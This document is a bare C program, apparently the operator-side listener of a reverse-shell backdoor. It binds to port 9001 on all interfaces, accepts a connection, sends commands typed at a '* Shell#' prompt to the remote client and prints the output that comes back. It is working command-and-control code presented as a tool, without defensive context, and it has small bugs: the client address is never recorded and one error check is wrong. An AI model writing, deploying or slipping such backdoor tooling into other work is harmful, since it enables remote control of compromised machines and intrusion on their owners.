#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sockD, client_socket;  // Socket descriptors
    char buffer[1024];         // Buffer to store commands
    char response[18384];      // Buffer to store command outputs
    struct sockaddr_in server_addr, client_addr; // Structs for server and client addresses
    int i = 0;
    int optval = 1;            // Option value for setsockopt

    socklen_t client_length;   // Length of the client address

    printf("starting\n");

    // Create a socket
    sockD = socket(AF_INET, SOCK_STREAM, 0);
    if (sockD < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Set socket options to reuse the address
    if (setsockopt(sockD, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) > 0) {
        printf("Error Setting TCP Socket Options\n");
        return 1;
    }

    printf("initialising\n");

    // Initialize server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("0.0.0.0");  // Bind to all available interfaces
    server_addr.sin_port = htons(9001);  // Port number

    printf("binding\n");

    // Bind the socket to the specified IP and port
    if (bind(sockD, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(sockD);
        return 1;
    }

    printf("listening\n");

    // Listen for incoming connections
    if (listen(sockD, 10) < 0) {
        perror("Listen failed");
        close(sockD);
        return 1;
    }

    client_length = sizeof(client_addr);

    while (1) {
        // Accept an incoming connection
        client_socket = accept(sockD, (struct sockaddr *)NULL, NULL);
        if (client_socket < 0) {
            perror("Accept failed");
            continue;
        }
        printf("connected");

    jump:
        // Clear the buffers
        memset(&buffer, 0, sizeof(buffer));
        memset(&response, 0, sizeof(response));

        // Print prompt and read command from user
        printf("* Shell#%s~$: ", inet_ntoa(client_addr.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");  // Remove the newline character

        // Send the command to the client
        write(client_socket, buffer, sizeof(buffer));

        // Check for exit command
        if (strncmp("q", buffer, 1) == 0) {
            close(client_socket);
            return 0;
        } else {
            // Receive the command output from the client
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
            goto jump;  // Go back to prompt for next command
        }
    }

    return 0;
}
